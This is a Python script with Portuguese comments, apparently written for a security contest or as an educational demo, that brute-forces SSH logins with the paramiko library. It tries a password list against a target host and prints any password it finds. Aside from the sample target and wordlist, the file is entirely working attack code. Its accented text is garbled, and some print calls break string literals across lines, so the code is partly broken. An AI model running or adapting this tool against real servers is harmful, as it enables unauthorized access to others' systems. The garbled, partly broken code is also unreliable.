#!/usr/bin/env python3
"""EXPLORA√á√ÉO DE SERVI√áO - FOR√áA BRUTA SSH
Demonstra√ß√£o educacional de ataque de for√ßa bruta contra um servi√ßo SSH
usando a biblioteca real 'paramiko'.
"""
import paramiko
import time
import json
from typing import Dict, List

class SSHExploit:
    """Executa um ataque de for√ßa bruta SSH."""
    
    def __init__(self, target_ip: str, username: str, password_list: List[str]):
        self.target_ip = target_ip
        self.target_port = 22
        self.username = username
        self.password_list = password_list
        self.found_password = None
        
    def brute_force_attack(self) -> Dict:
        """Executa o ataque de for√ßa bruta SSH."""
        print(f"[*] Iniciando ataque de For√ßa Bruta SSH contra {self.target_ip}:{self.target_port} para o usu√°rio {self.username}")
        
        results = {
            "status": "FAILED",
            "target": f"{self.target_ip}:{self.target_port}",
            "username": self.username,
            "attempts": 0,
            "found_password": "N/A",
            "log": []
        }
        
        for password in self.password_list:
            results["attempts"] += 1
            log_entry = {"password": password, "status": "FAILED"}
            
            try:
                # 1. Criar o cliente SSH
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # 2. Tentar a conex√£o (o cora√ß√£o da explora√ß√£o)
                client.connect(
                    hostname=self.target_ip,
                    port=self.target_port,
                    username=self.username,
                    password=password,
                    timeout=3, # Timeout para n√£o travar
                    banner_timeout=3
                )
                
                # Se a conex√£o for bem-sucedida
                self.found_password = password
                log_entry["status"] = "SUCCESS"
                results["status"] = "SUCCESS"
                results["found_password"] = password
                results["log"].append(log_entry)
                print(f"[!!!] SENHA ENCONTRADA: {password}")
                client.close()
                break
                
            except paramiko.AuthenticationException:
                # Senha incorreta
                log_entry["status"] = "FAILED"
            except paramiko.SSHException as e:
                # Erro de conex√£o ou timeout
                log_entry["status"] = f"ERROR: {e}"
            except Exception as e:
                # Outros erros (ex: porta fechada)
                log_entry["status"] = f"ERROR: {e}"
            
            results["log"].append(log_entry)
            
            # Pequeno delay para simular o tempo de rede
            time.sleep(0.1)
            
        print(f"[+] Ataque conclu√≠do. Tentativas: {results['attempts']}")
        return results

def main():
    # Exemplo de uso (em um ambiente isolado)
    # Nota: Para o concurso, o Nmap deve encontrar um alvo com porta 22 aberta
    target_ip = "127.0.0.1" # Alvo de teste
    username = "testuser"
    password_list = ["123456", "password", "admin", "testuser123"]
    
    exploit = SSHExploit(target_ip, username, password_list)
    results = exploit.brute_force_attack()
    
    print("
" + "="*80)
    print("üìã RELAT√ìRIO DE EXPLORA√á√ÉO SSH (PARAMIKO)")
    print("="*80 + "
")
    print(json.dumps(results, indent=2, default=str))

if __name__ == "__main__":
    main()
